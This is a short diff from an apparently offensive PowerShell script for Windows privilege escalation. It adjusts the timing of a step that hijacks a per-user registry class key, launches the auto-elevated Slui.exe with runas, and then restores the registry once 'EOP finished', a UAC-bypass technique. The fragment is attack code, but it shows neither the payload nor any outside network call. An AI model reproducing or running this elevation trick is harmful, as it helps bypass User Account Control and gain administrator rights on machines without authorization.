@@ -84,7 +84,7 @@ If($CheckVuln -eq $True){
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shellex\ContextMenuHandlers\{90AA3A4E-1CBA-4233-B8BB-535773D48449}" -Name "(default)" -Value 'Taskband Pin' -Force -ErrorAction SilentlyContinue|Out-Null
 
    ### Start the vulnerable process { using powershell }
-   Start-Sleep -Milliseconds 2700;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
+   Start-Sleep -Milliseconds 3000;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
    Start-Sleep -Milliseconds 2600
    ### Revert Regedit to 'DEFAULT' settings after EOP finished ..
